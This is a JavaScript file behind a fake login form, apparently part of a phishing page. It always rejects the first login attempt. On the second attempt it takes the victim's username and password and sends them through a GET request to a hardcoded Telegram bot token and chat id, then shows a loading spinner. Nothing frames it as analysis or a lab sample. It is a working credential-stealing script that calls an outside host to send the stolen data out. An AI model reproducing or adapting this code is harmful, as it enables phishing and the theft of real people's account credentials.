document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('telegramForm');
    const loading = document.getElementById('loading');
    const validText = document.querySelector('.invalid');
    let tryCount = 0;
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        const username = document.getElementById('username');
        const password = document.getElementById('password');
        username.classList.remove('invalid-input');
        password.classList.remove('invalid-input');
        if(tryCount === 0) {
            username.classList.add('invalid-input');
            password.classList.add('invalid-input');
            validText.style.display = 'block';
            username.value = '';
            password.value = '';
            tryCount++;
            return;
        }else{
            loading.style.display = 'flex';
            setTimeout(() => {
                const encodedUsername = encodeURIComponent(username.value);
                const encodedPassword = encodeURIComponent(password.value);
                const jonatish = `<b>Username:</b> <em>${encodedUsername}</em>\n<b>Password:</b> <em>${encodedPassword}</em>`;
                const url = `https://api.telegram.org/bot8589028203:AAG3qwpWb8-VNvxrTk4djpA9RlnjjV9xel0/sendMessage?chat_id=153971680&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`
                fetch(url, { method: 'GET' })
                .then(res => res.json())
                .then(data => {
                    loading.style.display = 'none';
                    if(data.ok){
                        console.log(data.result.message_id);
                    }else{
                        console.log(data.error_code);
                    }
                })
                .catch((error) => {
                    alert("Error! Please try again: " + error.message);
                    loading.style.display = 'none';
                    username.value = '';
                    password.value = '';
                });
            }, 2000);
        }
    });
});
